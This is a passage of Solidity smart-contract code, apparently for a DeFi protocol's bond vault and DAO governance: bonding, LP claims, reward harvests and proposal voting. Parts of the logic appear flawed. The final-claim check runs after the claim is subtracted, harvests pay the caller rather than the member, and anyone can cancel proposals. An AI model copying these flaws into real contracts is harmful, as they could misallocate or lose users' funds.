mapMemberPool_weight[member][pool] = 0; // Zero out user weight (scope: user -> pool)\n        }\n        uint256 weight = iUTILS(_DAO().UTILS()).getPoolShareWeight(asset, mapBondAsset_memberDetails[asset].bondedLP[member]); // Calculate user's bonded weight\n        mapMemberPool_weight[member][pool] = weight; // Set new weight (scope: user -> pool)\n        mapMember_weight[member] += weight; // Add new weight to totalWeight (scope: user)\n        totalWeight += weight; // Add new weight to totalWeight (scope: vault)\n    }\n\n    // Calculate the user's current available claim amount\n    function calcBondedLP(address member, address asset) public view returns (uint claimAmount){ \n        if(mapBondAsset_memberDetails[asset].isMember[member]){\n            uint256 _secondsSinceClaim = block.timestamp - mapBondAsset_memberDetails[asset].lastBlockTime[member]; // Get seconds passed since last claim\n            uint256 rate = mapBondAsset_memberDetails[asset].claimRate[member]; // Get user's claim rate\n            claimAmount = _secondsSinceClaim * rate; // Set claim amount\n            if(claimAmount >= mapBondAsset_memberDetails[asset].bondedLP[member] || bondRelease){\n                claimAmount = mapBondAsset_memberDetails[asset].bondedLP[member]; // If final claim; set claimAmount as remainder\n            }\n            return claimAmount;\n        }\n    }\n\n    // Perform a claim of the users's current available claim amount\n    function claimForMember(address asset, address member) public onlyDAO returns (bool){\n        require(mapBondAsset_memberDetails[asset].bondedLP[member] > 0, '!bonded'); // They must have remaining unclaimed LPs\n        require(mapBondAsset_memberDetails[asset].isMember[member], '!member'); // They must be a member (scope: user -> asset)\n        uint256 _claimable = calcBondedLP(member, asset); // Get the current claimable amount\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(asset); // Get the pool address\n        mapBondAsset_memberDetails[asset].lastBlockTime[member] = block.timestamp; // Set lastBlockTime to current time\n        mapBondAsset_memberDetails[asset].bondedLP[member] -= _claimable; // Remove the claim amount from the user's remainder\n        if(_claimable == mapBondAsset_memberDetails[asset].bondedLP[member]){\n            mapBondAsset_memberDetails[asset].claimRate[member] = 0; // If final claim; zero-out their claimRate\n        }\n        decreaseWeight(asset, member); // Update user's weight\n        iBEP20(_pool).transfer(member, _claimable); // Send claim amount to user\n        return true;\n    }\n\n    // Decrease user's weight in the BondVault\n    function decreaseWeight(address asset, address member) internal {\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(asset); // Get pool address\n        totalWeight -= mapMemberPool_weight[member][_pool]; // Remove user weight from totalWeight (scope: vault)\n        mapMember_weight[member] -= mapMemberPool_weight[member][_pool]; // Remove user weight from totalWeight (scope: user)\n        mapMemberPool_weight[member][_pool] = 0; // Zero out user weight (scope: user -> pool)\n        uint256 weight = iUTILS(_DAO().UTILS()).getPoolShareWeight(asset, mapBondAsset_memberDetails[asset].bondedLP[member]); // Calculate user's bonded weight\n        mapMemberPool_weight[member][_pool] = weight; // Set new weight (scope: user -> pool)\n        mapMember_weight[member] += weight; // Add new weight to totalWeight (scope: user)\n        totalWeight += weight; // // Add new weight to totalWeight (scope: vault)\n    }\n\n    // Get the total count of all existing & past BondVault members\n    function memberCount() external view returns (uint256 count){\n        return arrayMembers.length;\n    }\n\n    // Get array of all existing & past BondVault members\n    function allMembers() external view returns (address[] memory _allMembers){\n        return arrayMembers;\n    }\n\n    function release() external onlyDAO {\n        bondRelease = true;\n    }\n\n    // Get a bond details (scope: user -> asset)\n    function getMemberDetails(address member, address asset) external view returns (MemberDetails memory memberDetails){\n        memberDetails.isMember = mapBondAsset_memberDetails[asset].isMember[member];\n        memberDetails.bondedLP = mapBondAsset_memberDetails[asset].bondedLP[member];\n        memberDetails.claimRate = mapBondAsset_memberDetails[asset].claimRate[member];\n        memberDetails.lastBlockTime = mapBondAsset_memberDetails[asset].lastBlockTime[member];\n        return memberDetails;\n    }\n\n    // Get a users's totalWeight (scope: user)\n    function getMemberWeight(address member) external view returns (uint256) {\n        if (mapMember_weight[member] > 0) {\n            return mapMember_weight[member];\n        } else {\n            return 0;\n        }\n    } \n}\n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iRESERVE.sol\";\nimport \"./interfaces/iDAOVAULT.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iBONDVAULT.sol\";\nimport \"./interfaces/iBASE.sol\"; \nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iPOOLFACTORY.sol\";\nimport \"./interfaces/iSYNTHFACTORY.sol\";\nimport \"./interfaces/iSYNTHVAULT.sol\";\n\ncontract Dao {\n    address public DEPLOYER;\n    address public BASE;\n\n    uint256 public secondsPerEra;   // Amount of seconds per era (Inherited from BASE contract; intended to be ~1 day)\n    uint256 public coolOffPeriod;   // Amount of time a proposal will need to be in finalising stage before it can be finalised\n    uint256 public proposalCount;   // Count of proposals\n    uint256 public majorityFactor;  // Number used to calculate majority; intended to be 6666bp === 2/3\n    uint256 public erasToEarn;      // Amount of eras that make up the targeted RESERVE depletion; regulates incentives\n    uint256 public daoClaim;        // The DAOVault's portion of rewards; intended to be ~10% initially\n    uint256 public daoFee;          // The SPARTA fee for a user to create a new proposal, intended to be 100 SPARTA initially\n    uint256 public currentProposal; // The most recent proposal; should be === proposalCount\n    \n    struct MemberDetails {\n        bool isMember;\n        uint weight;\n        uint lastBlock;\n        uint poolCount;\n    }\n    struct ProposalDetails {\n        uint id;\n        string proposalType;\n        uint votes;\n        uint coolOffTime;\n        bool finalising;\n        bool finalised;\n        uint param;\n        address proposedAddress;\n        bool open;\n        uint startTime;\n    }\n\n    bool public daoHasMoved;\n    address public DAO;\n\n    iROUTER private _ROUTER;\n    iUTILS private _UTILS;\n    iBONDVAULT private _BONDVAULT;\n    iDAOVAULT private _DAOVAULT;\n    iPOOLFACTORY private _POOLFACTORY;\n    iSYNTHFACTORY private _SYNTHFACTORY;\n    iRESERVE private _RESERVE;\n    iSYNTHVAULT private _SYNTHVAULT;\n\n    address[] public arrayMembers;\n    address [] listedBondAssets; // Only used in UI; is intended to be a historical array of all past Bond listed assets\n    uint256 public bondingPeriodSeconds = 15552000; // Vesting period for bonders (6 months)\n    \n    mapping(address => bool) public isMember;\n    mapping(address => bool) public isListed; // Used internally to get CURRENT listed Bond assets\n    mapping(address => uint256) public mapMember_lastTime;\n\n    mapping(uint256 => uint256) public mapPID_param;\n    mapping(uint256 => address) public mapPID_address;\n    mapping(uint256 => string) public mapPID_type;\n    mapping(uint256 => uint256) public mapPID_votes;\n    mapping(uint256 => uint256) public mapPID_coolOffTime;\n    mapping(uint256 => bool) public mapPID_finalising;\n    mapping(uint256 => bool) public mapPID_finalised;\n    mapping(uint256 => bool) public mapPID_open;\n    mapping(uint256 => uint256) public mapPID_startTime;\n    mapping(uint256 => mapping(address => uint256)) public mapPIDMember_votes;\n\n    event MemberDeposits(address indexed member, address indexed pool, uint256 amount);\n    event MemberWithdraws(address indexed member, address indexed pool, uint256 balance);\n\n    event NewProposal(address indexed member, uint indexed proposalID, string proposalType);\n    event NewVote(address indexed member, uint indexed proposalID, uint voteWeight, uint totalVotes, string proposalType);\n    event RemovedVote(address indexed member, uint indexed proposalID, uint voteWeight, uint totalVotes, string proposalType);\n    event ProposalFinalising(address indexed member, uint indexed proposalID, uint timeFinalised, string proposalType);\n    event CancelProposal(address indexed member, uint indexed proposalID);\n    event FinalisedProposal(address indexed member, uint indexed proposalID, uint votesCast, uint totalWeight, string proposalType);\n    event ListedAsset(address indexed DAO, address indexed asset);\n    event DelistedAsset(address indexed DAO, address indexed asset);\n    event DepositAsset(address indexed owner, uint256 depositAmount, uint256 bondedLP);\n\n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == DEPLOYER);\n        _;\n    }\n\n    constructor (address _base){\n        BASE = _base;\n        DEPLOYER = msg.sender;\n        DAO = address(this);\n        coolOffPeriod = 259200;\n        erasToEarn = 30;\n        majorityFactor = 6666;\n        daoClaim = 1000;\n        daoFee = 100;\n        proposalCount = 0;\n        secondsPerEra = iBASE(BASE).secondsPerEra();\n    }\n\n    //==================================== PROTOCOL CONTRACTs SETTER =================================//\n\n    function setGenesisAddresses(address _router, address _utils, address _reserve) external onlyDAO {\n        _ROUTER = iROUTER(_router);\n        _UTILS = iUTILS(_utils);\n        _RESERVE = iRESERVE(_reserve);\n    }\n\n    function setVaultAddresses(address _daovault, address _bondvault, address _synthVault) external onlyDAO {\n        _DAOVAULT = iDAOVAULT(_daovault);\n        _BONDVAULT = iBONDVAULT(_bondvault);\n        _SYNTHVAULT = iSYNTHVAULT(_synthVault); \n    }\n    \n    function setFactoryAddresses(address _poolFactory, address _synthFactory) external onlyDAO {\n        _POOLFACTORY = iPOOLFACTORY(_poolFactory);\n        _SYNTHFACTORY = iSYNTHFACTORY(_synthFactory);\n    }\n\n    function setGenesisFactors(uint32 _coolOff, uint32 _daysToEarn, uint32 _majorityFactor, uint32 _daoClaim, uint32 _daoFee) external onlyDAO {\n        coolOffPeriod = _coolOff;\n        erasToEarn = _daysToEarn;\n        majorityFactor = _majorityFactor;\n        daoClaim = _daoClaim;\n        daoFee = _daoFee;\n    }\n\n    // Can purge deployer once DAO is stable and final\n    function purgeDeployer() external onlyDAO {\n        DEPLOYER = address(0);\n    }\n\n    // Can change vesting period for bonders\n    function changeBondingPeriod(uint256 bondingSeconds) external onlyDAO{\n        bondingPeriodSeconds = bondingSeconds;\n    }\n\n    //============================== USER - DEPOSIT/WITHDRAW ================================//\n\n    // User deposits LP tokens in the DAOVault\n    function deposit(address pool, uint256 amount) external {\n        depositLPForMember(pool, amount, msg.sender);\n    }\n\n    // Contract deposits LP tokens for member\n    function depositLPForMember(address pool, uint256 amount, address member) public {\n        require(_POOLFACTORY.isCuratedPool(pool) == true, \"!curated\"); // Pool must be Curated\n        require(amount > 0, \"!amount\"); // Deposit amount must be valid\n        if (isMember[member] != true) {\n            arrayMembers.push(member); // If not a member; add user to member array\n            isMember[member] = true; // If not a member; register the user as member\n        }\n        if((_DAOVAULT.getMemberWeight(member) + _BONDVAULT.getMemberWeight(member)) > 0) {\n            harvest(); // If member has existing weight; force harvest to block manipulation of lastTime + harvest\n        }\n        require(iBEP20(pool).transferFrom(msg.sender, address(_DAOVAULT), amount), \"!funds\"); // Send user's deposit to the DAOVault\n        _DAOVAULT.depositLP(pool, amount, member); // Update user's deposit balance & weight\n        mapMember_lastTime[member] = block.timestamp; // Reset user's last harvest time\n        emit MemberDeposits(member, pool, amount);\n    }\n    \n    // User withdraws all of their selected asset from the DAOVault\n    function withdraw(address pool) external {\n        removeVote(); // Users weight is removed from the current open DAO proposal\n        require(_DAOVAULT.withdraw(pool, msg.sender), \"!transfer\"); // User receives their withdrawal\n    }\n\n    //============================== REWARDS ================================//\n    \n    // User claims their DAOVault incentives\n    function harvest() public {\n        require(_RESERVE.emissions(), \"!emissions\"); // Reserve must have emissions turned on\n        uint reward = calcCurrentReward(msg.sender); // Calculate the user's claimable incentive\n        mapMember_lastTime[msg.sender] = block.timestamp; // Reset user's last harvest time\n        uint reserve = iBEP20(BASE).balanceOf(address(_RESERVE)); // Get total BASE balance of RESERVE\n        uint daoReward = (reserve * daoClaim) / 10000; // Get DAO's share of BASE balance of RESERVE (max user claim amount)\n        if(reward > daoReward){\n            reward = daoReward; // User cannot claim more than the daoReward limit\n        }\n        _RESERVE.grantFunds(reward, msg.sender); // Send the claim to the user\n    }\n\n    // Calculate the user's current incentive-claim per era\n    function calcCurrentReward(address member) public view returns(uint){\n        uint secondsSinceClaim = block.timestamp - mapMember_lastTime[member]; // Get seconds passed since last claim\n        uint share = calcReward(member); // Get share of rewards for user\n        uint reward = (share * secondsSinceClaim) / secondsPerEra; // User's share times eras since they last claimed\n        return reward;\n    }\n\n    // Calculate the user's current total claimable incentive\n    function calcReward(address member) public view returns(uint){\n        uint weight = _DAOVAULT.getMemberWeight(member) + _BONDVAULT.getMemberWeight(member); // Get combined total weights (scope: user)\n        uint _totalWeight = _DAOVAULT.totalWeight() + _BONDVAULT.totalWeight(); // Get combined total weights (scope: vaults)\n        uint reserve = iBEP20(BASE).balanceOf(address(_RESERVE)) / erasToEarn; // Aim to deplete reserve over a number of days\n        uint daoReward = (reserve * daoClaim) / 10000; // Get the DAO's share of that\n        return _UTILS.calcShare(weight, _totalWeight, daoReward); // Get users's share of that (1 era worth)\n    }\n\n    //================================ BOND Feature ==================================//\n\n    // Can burn the SPARTA remaining in this contract (Bond allocations held in the DAO)\n    function burnBalance() external onlyDAO returns (bool){\n        uint256 baseBal = iBEP20(BASE).balanceOf(address(this));\n        iBASE(BASE).burn(baseBal);   \n        return true;\n    }\n\n    // Can transfer the SPARTA remaining in this contract to a new DAO (If DAO is upgraded)\n    function moveBASEBalance(address newDAO) external onlyDAO {\n        uint256 baseBal = iBEP20(BASE).balanceOf(address(this));\n        iBEP20(BASE).transfer(newDAO, baseBal);\n    }\n\n    // List an asset to be enabled for Bonding\n    function listBondAsset(address asset) external onlyDAO {\n        if(!isListed[asset]){\n            isListed[asset] = true; // Register as a currently enabled asset\n            listedBondAssets.push(asset); // Add to historical record of past Bond assets\n        }\n        emit ListedAsset(msg.sender, asset);\n    }\n\n    // Delist an asset from the Bond program\n    function delistBondAsset(address asset) external onlyDAO {\n        isListed[asset] = false; // Unregister as a currently enabled asset\n        emit DelistedAsset(msg.sender, asset);\n    }\n\n    // User deposits assets to be Bonded\n    function bond(address asset, uint256 amount) external payable returns (bool success) {\n        require(amount > 0, '!amount'); // Amount must be valid\n        require(isListed[asset], '!listed'); // Asset must be listed for Bond\n        if (isMember[msg.sender] != true) {\n            arrayMembers.push(msg.sender); // If user is not a member; add them to the member array\n            isMember[msg.sender] = true; // Register user as a member\n        }\n        if((_DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender)) > 0) {\n            harvest(); // If member has existing weight; force harvest to block manipulation of lastTime + harvest\n        }\n        uint256 liquidityUnits = handleTransferIn(asset, amount); // Add liquidity and calculate LP units\n        _BONDVAULT.depositForMember(asset, msg.sender, liquidityUnits); // Deposit the Bonded LP units in the BondVault\n        mapMember_lastTime[msg.sender] = block.timestamp; // Reset user's last harvest time\n        emit DepositAsset(msg.sender, amount, liquidityUnits);\n        return true;\n    }\n\n    // Add Bonded assets as liquidity and calculate LP units\n    function handleTransferIn(address _token, uint _amount) internal returns (uint LPunits){\n        uint256 spartaAllocation = _UTILS.calcSwapValueInBase(_token, _amount); // Get the SPARTA swap value of the bonded assets\n        if(iBEP20(BASE).allowance(address(this), address(_ROUTER)) < spartaAllocation){\n            iBEP20(BASE).approve(address(_ROUTER), iBEP20(BASE).totalSupply()); // Increase SPARTA allowance if required\n        }\n        if(_token == address(0)){\n            require((_amount == msg.value), \"!amount\");\n            LPunits = _ROUTER.addLiquidityForMember{value:_amount}(spartaAllocation, _amount, _token, address(_BONDVAULT)); // Add spartaAllocation & BNB as liquidity to mint LP tokens\n        } else {\n            iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer user's assets to Dao contract\n            if(iBEP20(_token).allowance(address(this), address(_ROUTER)) < _amount){\n                uint256 approvalTNK = iBEP20(_token).totalSupply();\n                iBEP20(_token).approve(address(_ROUTER), approvalTNK); // Increase allowance if required\n            }\n            LPunits = _ROUTER.addLiquidityForMember(spartaAllocation, _amount, _token, address(_BONDVAULT)); // Add spartaAllocation & assets as liquidity to mint LP tokens\n        } \n    }\n\n    // User claims all of their unlocked Bonded LPs\n    function claimAllForMember(address member) external returns (bool){\n        address [] memory listedAssets = listedBondAssets; // Get array of bond assets\n        for(uint i = 0; i < listedAssets.length; i++){\n            uint claimA = calcClaimBondedLP(member, listedAssets[i]); // Check user's unlocked Bonded LPs for each asset\n            if(claimA > 0){\n               _BONDVAULT.claimForMember(listedAssets[i], member); // Claim LPs if any unlocked\n            }\n        }\n        return true;\n    }\n\n    // User claims unlocked Bond units of a selected asset\n    function claimForMember(address asset) external returns (bool){\n        uint claimA = calcClaimBondedLP(msg.sender, asset); // Check user's unlocked Bonded LPs\n        if(claimA > 0){\n            _BONDVAULT.claimForMember(asset, msg.sender); // Claim LPs if any unlocked\n        }\n        return true;\n    }\n    \n    // Calculate user's unlocked Bond units of a selected asset\n    function calcClaimBondedLP(address bondedMember, address asset) public returns (uint){\n        uint claimAmount = _BONDVAULT.calcBondedLP(bondedMember, asset); // Check user's unlocked Bonded LPs\n        return claimAmount;\n    }\n\n    //============================== CREATE PROPOSALS ================================//\n\n    // New ID, but specify type, one type for each function call\n    // Votes counted to IDs\n    // IDs are finalised\n    // IDs are executed, but type specifies unique logic\n\n    // New DAO proposal: Simple action\n    function newActionProposal(string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: uint parameter\n    function newParamProposal(uint32 param, string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_param[currentProposal] = param; // Set the proposed parameter\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: Address parameter\n    function newAddressProposal(address proposedAddress, string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_address[currentProposal] = proposedAddress; // Set the proposed new address\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: Grant SPARTA to wallet\n    function newGrantProposal(address recipient, uint amount) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        string memory typeStr = \"GRANT\";\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        mapPID_address[currentProposal] = recipient; // Set the proposed grant recipient\n        mapPID_param[currentProposal] = amount; // Set the proposed grant amount\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // If no existing open DAO proposal; register a new one\n    function checkProposal() internal {\n        require(mapPID_open[currentProposal] == false, '!open'); // There must not be an existing open proposal\n        proposalCount += 1; // Increase proposal count\n        currentProposal = proposalCount; // Set current proposal to the new count\n        mapPID_open[currentProposal] = true; // Set new proposal as open status\n        mapPID_startTime[currentProposal] = block.timestamp; // Set the start time of the proposal to now\n    }\n    \n    // Pay the fee for a new DAO proposal\n    function payFee() internal returns(bool){\n        uint _amount = daoFee*(10**18); // Convert DAO fee to WEI\n        require(iBEP20(BASE).transferFrom(msg.sender, address(_RESERVE), _amount), '!fee'); // User pays the new proposal fee\n        return true;\n    } \n\n    //============================== VOTE && FINALISE ================================//\n\n    // Vote for a proposal\n    function voteProposal() external returns (uint voteWeight) {\n        require(mapPID_open[currentProposal] == true, \"!open\"); // Proposal must be open status\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        voteWeight = countVotes(); // Vote for proposal and recount\n        if(hasQuorum(currentProposal) && mapPID_finalising[currentProposal] == false){\n            if(isEqual(_type, 'DAO') || isEqual(_type, 'UTILS') || isEqual(_type, 'RESERVE') ||isEqual(_type, 'GET_SPARTA') || isEqual(_type, 'ROUTER') || isEqual(_type, 'LIST_BOND')|| isEqual(_type, 'GRANT')|| isEqual(_type, 'ADD_CURATED_POOL')){\n                if(hasMajority(currentProposal)){\n                    _finalise(); // Critical proposals require 'majority' consensus to enter finalization phase\n                }\n            } else {\n                _finalise(); // Other proposals require 'quorum' consensus to enter finalization phase\n            }\n        }\n        emit NewVote(msg.sender, currentProposal, voteWeight, mapPID_votes[currentProposal], string(_type));\n    }\n\n    // Remove vote from a proposal\n    function removeVote() public returns (uint voteWeightRemoved){\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        voteWeightRemoved = mapPIDMember_votes[currentProposal][msg.sender]; // Get user's current vote weight\n        if(mapPID_open[currentProposal]){\n            mapPID_votes[currentProposal] -= voteWeightRemoved; // Remove user's votes from propsal (scope: proposal)\n        }\n        mapPIDMember_votes[currentProposal][msg.sender] = 0; // Remove user's votes from propsal (scope: member)\n        emit RemovedVote(msg.sender, currentProposal, voteWeightRemoved, mapPID_votes[currentProposal], string(_type));\n        return voteWeightRemoved;\n    }\n\n    // Push the proposal into 'finalising' status\n    function _finalise() internal {\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        mapPID_finalising[currentProposal] = true; // Set finalising status to true\n        mapPID_coolOffTime[currentProposal] = block.timestamp; // Set timestamp to calc cooloff time from\n        emit ProposalFinalising(msg.sender, currentProposal, block.timestamp+coolOffPeriod, string(_type));\n    }\n\n    // Attempt to cancel the open proposal\n    function cancelProposal() external {\n        require(block.timestamp > (mapPID_startTime[currentProposal] + 1296000), \"!days\"); // Proposal must not be new\n        mapPID_votes[currentProposal] = 0; // Clear all votes from the proposal\n        mapPID_open[currentProposal] = false; // Set the proposal as not open (closed status)\n        emit CancelProposal(msg.sender, currentProposal);\n    }\n\n    // A finalising-stage proposal can be finalised after the cool off period\n    function finaliseProposal() external {\n        require((block.timestamp - mapPID_coolOffTime[currentProposal]) > coolOffPeriod, \"!cooloff\"); // Must be past cooloff period\n        require(mapPID_finalising[currentProposal] == true, \"!finalising\"); // Must be in finalising stage\n        if(!hasQuorum(currentProposal)){\n            mapPID_finalising[currentProposal] = false; // If proposal has lost quorum consensus; kick it out of the finalising stage\n        } else {\n            bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n            if(isEqual(_type, 'DAO')){\n                moveDao(currentProposal);\n            } else if (isEqual(_type, 'ROUTER')) {\n                moveRouter(currentProposal);\n            } else if (isEqual(_type, 'UTILS')){\n                moveUtils(currentProposal);\n            } else if (isEqual(_type, 'RESERVE')){\n                moveReserve(currentProposal);\n            } else if (isEqual(_type, 'FLIP_EMISSIONS')){\n                flipEmissions(currentProposal);\n            } else if (isEqual(_type, 'COOL_OFF')){\n                changeCooloff(currentProposal);\n            } else if (isEqual(_type, 'ERAS_TO_EARN')){\n                changeEras(currentProposal);\n            } else if (isEqual(_type, 'GRANT')){\n                grantFunds(currentProposal);\n            } else if (isEqual(_type, 'GET_SPARTA')){\n                _increaseSpartaAllocation(currentProposal);\n            } else if (isEqual(_type, 'LIST_BOND')){\n                _listBondingAsset(currentProposal);\n            } else if (isEqual(_type, 'DELIST_BOND')){\n                _delistBondingAsset(currentProposal);\n            } else if (isEqual(_type, 'ADD_CURATED_POOL')){\n                _addCuratedPool(currentProposal);\n            } else if (isEqual(_type, 'REMOVE_CURATED_POOL')){\n                _removeCuratedPool(currentProposal);\n            } \n        }\n    }\n\n    // Change the DAO to a new contract address\n    function moveDao(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        DAO = _proposedAddress; // Change the DAO to point to the new DAO address\n        iBASE(BASE).changeDAO(_proposedAddress); // Change the BASE contract to point to the new DAO address\n        daoHasMoved = true; // Set status of this old DAO\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the ROUTER to a new contract address\n    function moveRouter(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _ROUTER = iROUTER(_proposedAddress); // Change the DAO to point to the new ROUTER address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the UTILS to a new contract address\n    function moveUtils(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _UTILS = iUTILS(_proposedAddress); // Change the DAO to point to the new UTILS address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the RESERVE to a new contract address\n    function moveReserve(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _RESERVE = iRESERVE(_proposedAddress); // Change the DAO to point to the new RESERVE address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Flip the BASE emissions on/off\n    function flipEmissions(uint _proposalID) internal {\n        iBASE(BASE).flipEmissions(); // Toggle emissions on the BASE contract\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change cool off period (Period of time until a finalising proposal can be finalised)\n    function changeCooloff(uint _proposalID) internal {\n        uint256 _proposedParam = mapPID_param[_proposalID]; // Get the proposed new param\n        require(_proposedParam != 0, \"!param\"); // Proposed param must be valid\n        coolOffPeriod = _proposedParam; // Change coolOffPeriod\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change erasToEarn (Used to regulate the incentives flow)\n    function changeEras(uint _proposalID) internal {\n        uint256 _proposedParam = mapPID_param[_proposalID]; // Get the proposed new param\n        require(_proposedParam != 0, \"!param\"); // Proposed param must be valid\n        erasToEarn = _proposedParam; // Change erasToEarn\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Grant SPARTA to the proposed recipient\n    function grantFunds(uint _proposalID) internal {\n        uint256 _proposedAmount = mapPID_param[_proposalID]; // Get the proposed SPARTA grant amount\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed SPARTA grant recipient\n        require(_proposedAmount != 0, \"!param\"); // Proposed grant amount must be valid\n        require(_proposedAddress != address(0), \"!address\"); // Proposed recipient must be valid\n        _RESERVE.grantFunds(_proposedAmount, _proposedAddress); // Grant the funds to the recipient\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Mint a 2.5M SPARTA allocation for the Bond program\n    function _increaseSpartaAllocation(uint _proposalID) internal {\n        uint256 _2point5m = 2.5*10**6*10**18; //_2.5m\n        iBASE(BASE).mintFromDAO(_2point5m, address(this)); // Mint SPARTA and send to DAO to hold\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // List an asset to be enabled for Bonding\n    function _listBondingAsset(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        if(!isListed[_proposedAddress]){\n            isListed[_proposedAddress] = true; // Register asset as listed for Bond\n            listedBondAssets.push(_proposedAddress); // Add asset to array of listed Bond assets\n        }\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Delist an asset from being allowed to Bond\n    function _delistBondingAsset(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        isListed[_proposedAddress] = false; // Unregister asset as listed for Bond (Keep it in the array though; as this is used in the UI)\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Add a pool as 'Curated' to enable synths, weight and incentives\n    function _addCuratedPool(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        _POOLFACTORY.addCuratedPool(_proposedAddress); // Add the pool as Curated\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Remove a pool from Curated status\n    function _removeCuratedPool(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed asset for removal\n        _POOLFACTORY.removeCuratedPool(_proposedAddress); // Remove pool as Curated\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n    \n    // After completing the proposal's action; close it\n    function completeProposal(uint _proposalID) internal {\n        string memory _typeStr = mapPID_type[_proposalID]; // Get proposal type\n        emit FinalisedProposal(msg.sender, _proposalID, mapPID_votes[_proposalID], _DAOVAULT.totalWeight(), _typeStr);\n        mapPID_votes[_proposalID] = 0; // Reset proposal votes to 0\n        mapPID_finalised[_proposalID] = true; // Finalise the proposal\n        mapPID_finalising[_proposalID] = false; // Remove proposal from 'finalising' stage\n        mapPID_open[_proposalID] = false; // Close the proposal\n    }\n\n    //============================== CONSENSUS ================================//\n    \n    // Add user's total weight to proposal and recount\n    function countVotes() internal returns (uint voteWeight){\n        mapPID_votes[currentProposal] -= mapPIDMember_votes[currentProposal][msg.sender]; // Remove user's current votes from the open proposal\n        voteWeight = _DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender); // Get user's combined total weights\n        mapPID_votes[currentProposal] += voteWeight; // Add user's total weight to the current open proposal (scope: proposal)\n        mapPIDMember_votes[currentProposal][msg.sender] = voteWeight; // Add user's total weight to the current open proposal (scope: member)\n        return voteWeight;\n    }\n\n    // Check if a proposal has Majority consensus\n    function hasMajority(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight() + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight * majorityFactor / 10000; // Majority > 66.6%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    // Check if a proposal has Quorum consensus\n    function hasQuorum(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight()  + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight / 2; // Quorum > 50%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    // Check if a proposal has Minority consensus\n    function hasMinority(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight()  + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight / 6; // Minority > 16.6%\n        if(votes > consensus){\n            return 